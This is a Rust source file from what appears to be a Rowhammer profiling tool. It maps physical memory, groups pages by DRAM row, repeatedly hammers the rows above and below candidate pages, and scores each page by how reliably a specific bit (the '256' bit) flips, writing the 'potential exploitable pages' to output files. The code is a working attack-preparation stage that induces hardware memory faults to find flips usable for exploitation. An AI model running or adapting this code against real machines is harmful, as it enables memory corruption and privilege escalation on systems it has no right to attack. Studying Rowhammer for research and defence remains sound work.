use std::{
    fs::{create_dir, File},
    io::{self, BufRead, Write},
    thread,
    time::{self, Instant},
};

use crate::profiler::utils::{
    collect_pages_by_row, count_flips_by_bit, fill_memory, rowhammer, setup_mapping, Consts, Page,
    PageData, Row,
};

const TEST_ITERATIONS: u32 = 10;
const RISK_THRESHOLD: u32 = 0;

pub(crate) struct PageCandidate {
    target_page: Page,
    above_pages: (Page, Page),
    below_pages: (Page, Page),

    score: u32,
}

impl PageCandidate {
    pub(crate) fn new(
        target_page: Page,
        above_pages: (Page, Page),
        below_pages: (Page, Page),
    ) -> Self {
        let target_flips = target_page.data.as_ref().unwrap().flips;

        Self {
            target_page,
            above_pages,
            below_pages,

            score: Self::calculate_score(&target_flips),
        }
    }

    /// Calculates the score of the PageCandidate
    pub(crate) fn calculate_score(flips: &[u64]) -> u32 {
        let position_bonus = 10;
        let score = (flips[8] + 1) as u32 * position_bonus;

        score
    }
}

/// Calculates the risk score of a page based on the uppermost 8 bits per halfword
fn calculate_risk_score(flips: &[u64]) -> u32 {
    let mut risk_score = 0;
    let max_position = 9;

    for (i, bit) in flips[max_position..].iter().enumerate() {
        risk_score += i as u64 * bit;
    }

    risk_score as u32
}

/// Print the number of 256 flips on the PageCandidate
fn count_256_flip(page: &Page) {
    let target_flips = page.data.as_ref().unwrap().flips;

    println!(
        "Target Page {:#x?} has {} 256 flips",
        page.pfn, target_flips[8]
    );
}

fn find_page(pages: &[Page], page_nbr: u64) -> Option<&Page> {
    pages.iter().find(|page| page.pfn == page_nbr)
}

fn setup_page_candidate(
    pages_by_row: &Vec<Row>,
    pfn: u64,
    above_pfns: (u64, u64),
    below_pfns: (u64, u64),
    target_flips: [u64; Consts::MAX_BITS],
) -> Result<PageCandidate, &'static str> {
    // Find the rows that contains the target pages
    for index in 0..pages_by_row.len() - 2 {
        let above_row_index = index;
        let target_row_index = index + 1;
        let below_row_index = index + 2;

        let above_row = &pages_by_row[above_row_index];
        let target_row = &pages_by_row[target_row_index];
        let below_row = &pages_by_row[below_row_index];

        let Some(target_page) = find_page(&target_row[..], pfn) else {
            continue;
        };
        let Some(above_page1) = find_page(&above_row[..], above_pfns.0) else {
            continue;
        };
        let Some(above_page2) = find_page(&above_row[..], above_pfns.1) else {
            continue;
        };
        let Some(below_page1) = find_page(&below_row[..], below_pfns.0) else {
            continue;
        };
        let Some(below_page2) = find_page(&below_row[..], below_pfns.1) else {
            continue;
        };

        let mut target_page = target_page.clone();

        // If pages are found, create a PageCandidate
        target_page.data = Some(PageData::new(above_pfns, below_pfns, target_flips));
        let page_candidate = PageCandidate::new(
            target_page,
            (above_page1.clone(), above_page2.clone()),
            (below_page1.clone(), below_page2.clone()),
        );

        return Ok(page_candidate);
    }

    Err("Could not find page candidate in current mapping, remapping!!!")
}

/// Output the PageCandidate to a file
fn output_page(page_candidate: &PageCandidate) -> io::Result<()> {
    let mut path = std::env::current_dir()?;

    if !path.join("data").exists() {
        create_dir(path.join("data"))?;
    }

    path.push(format!(
        "data/V_{:#x}",
        page_candidate.target_page.pfn as u64
    ));
    path.set_extension("out");
    println!("PATH: {:#?}", path);

    let mut file = File::create(path)?;

    let flips = page_candidate
        .target_page
        .data
        .as_ref()
        .expect("Flips should be defined at this stage")
        .flips;

    let width = 12;
    file.write_all(
        format!(
            "\t{:<width$}{:<width$}{:<width$}{:<width$}{:<width$}{:<7}{}\n",
            "Page", "aPFN1", "aPFN2", "bPFN1", "bPFN2", "Score", "Flipped bits"
        )
        .as_bytes(),
    )?;
    file.write_all(
        format!(
            ">\t{:<#width$x}{:<#width$x}{:<#width$x}{:<#width$x}{:<#width$x}{:<7}{:?}",
            page_candidate.target_page.pfn,
            page_candidate.above_pages.0.pfn,
            page_candidate.above_pages.1.pfn,
            page_candidate.below_pages.0.pfn,
            page_candidate.below_pages.1.pfn,
            page_candidate.score,
            flips,
        )
        .as_bytes(),
    )?;

    Ok(())
}

/// Read the flips.txt file and return a vector of potential exploitable pages
fn get_candidate_pages(pages_by_row: &Vec<Row>) -> Result<Vec<PageCandidate>, &'static str> {
    let mut page_candidates = Vec::new();

    let mut path = std::env::current_dir().unwrap();
    let file_name = "flips.out";
    path.push(file_name);

    let file = File::open(path).expect("Failed to open file {path}");

    let lines = io::BufReader::new(file).lines();
    //let start = std::time::Instant::now();

    for line in lines {
        if let Ok(s) = line {
            // Dont read line unless it starts with '>'
            if !s.starts_with(">") {
                continue;
            }

            let str = s.as_str();

            let start_flips = str.find("[").unwrap();
            let end_flips = str.find("]").unwrap_or(str.len());

            let flips = &str[start_flips + 1..end_flips];
            let flips = flips
                .split(",")
                .map(|s| {
                    s.trim()
                        .parse::<u64>()
                        .expect("Invalid format when parsing flip array")
                })
                .collect::<Vec<_>>();

            let good_sum = flips[8];
            let risk_sum = flips[9..]
                .iter()
                .enumerate()
                .fold(0, |acc, (i, bit)| acc + i as u64 * bit);

            let split_line = str[1..].split_whitespace().collect::<Vec<_>>();

            if risk_sum > 0 || good_sum < 3 {
                //println!(
                //    "Skipping Page {}, got risk: {}, and 256 flips {}",
                //    split_line[0], risk_sum, good_sum
                //);
                continue;
            }

            let pfns = split_line[..5]
                .iter()
                .map(|s| {
                    u64::from_str_radix(
                        match s.strip_prefix("0x") {
                            Some(s) => s,
                            None => s,
                        },
                        16,
                    )
                    .expect("Failed to parse hexstring in input file to u64")
                })
                .collect::<Vec<_>>();

            let (target_pfn, above_pfns, below_pfns) =
                (pfns[0], (pfns[1], pfns[2]), (pfns[3], pfns[4]));

            //println!("Target_page: {:#x?} for candidate evaluation", target_pfn);

            // Save the values of flips in an array
            let mut flips_arr = [0; Consts::MAX_BITS];
            for (i, flip) in flips.iter().enumerate() {
                flips_arr[i] = *flip;
            }

            let page_candidate =
                setup_page_candidate(pages_by_row, target_pfn, above_pfns, below_pfns, flips_arr)?;

            page_candidates.push(page_candidate);
        }
    }

    Ok(page_candidates)
}

fn profile_candidate_pages(page_candidates: Vec<PageCandidate>) {
    println!("Profiling {} Page Candidates", page_candidates.len());

    'candidate_loop: for mut candidate in page_candidates {
        println!("Testing candidate: {:#?}", candidate.target_page.pfn);

        let target_page = &candidate.target_page;
        let above_pages = &candidate.above_pages;
        let below_pages = &candidate.below_pages;

        unsafe {
            fill_memory(
                target_page.virt_addr,
                above_pages.0.virt_addr,
                below_pages.0.virt_addr,
            );
            fill_memory(
                target_page.virt_addr,
                above_pages.1.virt_addr,
                below_pages.1.virt_addr,
            );
        }

        let mut risk_score = 0;
        let mut score = 0;

        let mut hammer_flips = [0; Consts::MAX_BITS];

        for _ in 0..TEST_ITERATIONS {
            thread::sleep(time::Duration::from_millis(100));

            let before = Instant::now();
            for _ in 0..TEST_ITERATIONS {
                rowhammer(above_pages.0.virt_addr, below_pages.0.virt_addr);
            }
            println!("Time: {:#?}", before.elapsed() / TEST_ITERATIONS);

            let flips = count_flips_by_bit(&target_page, 0x0);

            score += PageCandidate::calculate_score(&flips);
            risk_score += calculate_risk_score(&flips);

            if risk_score > RISK_THRESHOLD {
                println!(
                    "Risk score too high, skipping candidate {:#?}",
                    candidate.target_page.pfn
                );
                continue 'candidate_loop;
            }

            println!("Flips: {:?}", flips);
            for index in 0..hammer_flips.len() {
                hammer_flips[index] += flips[index];
            }

            unsafe {
                std::ptr::write_bytes(target_page.virt_addr, 0x00, Consts::PAGE_SIZE);
            }
        }

        candidate.target_page.data.as_mut().unwrap().flips = hammer_flips;

        candidate.score = score;
        println!(
            "Candidate got score: {:#?}, risk score: {:#?}",
            candidate.score, risk_score
        );

        if candidate.score > 100 {
            println!("Good page found: {:#?}", candidate.target_page.pfn);
            output_page(&candidate).expect("Failed to output page");
        }
    }
}

pub(crate) fn main(dimms: u8) {
    let mut fraction_of_phys_memory = 0.0;
    let row_size = 128 * 1024 * dimms as usize;
    let mut mmap = setup_mapping(0.0);

    let result = loop {
        fraction_of_phys_memory += 0.1;

        if fraction_of_phys_memory > 0.9 {
            break None;
        }

        println!(
            "Setting up memory mapping with {} of physical memory",
            fraction_of_phys_memory
        );

        // Drop the old mapping in order to create a new one
        std::mem::drop(mmap);
        mmap = setup_mapping(fraction_of_phys_memory);

        println!("Collecting pages from mapping...");

        let pages_by_row = match collect_pages_by_row(&mut mmap, row_size) {
            Ok(pages_by_row) => {
                if pages_by_row.len() < 3 {
                    println!("Not enough rows in mapping, got {}", pages_by_row.len());
                    continue;
                }
                pages_by_row
            }
            Err(e) => {
                println!("Couldn't collect pages from mapping, got {:#?}", e);
                continue;
            }
        };

        println!("Finding candidate pages...");
        let candidates = get_candidate_pages(&pages_by_row);
        let candidates = match candidates {
            Ok(candidates) => candidates,
            Err(e) => {
                println!("Couldn't find all candidate pages, got {:#?}", e);
                continue;
            }
        };

        break Some((pages_by_row, candidates));
    };

    let candidates = match result {
        Some((pages_by_row, mut candidates)) => {
            println!(
                "Found {} candidates at frac: {}",
                candidates.len(),
                fraction_of_phys_memory
            );
            candidates.sort_by(|a, b| a.score.cmp(&b.score));

            candidates
        }
        None => {
            println!("No candidates found");
            return;
        }
    };

    profile_candidate_pages(candidates);
}
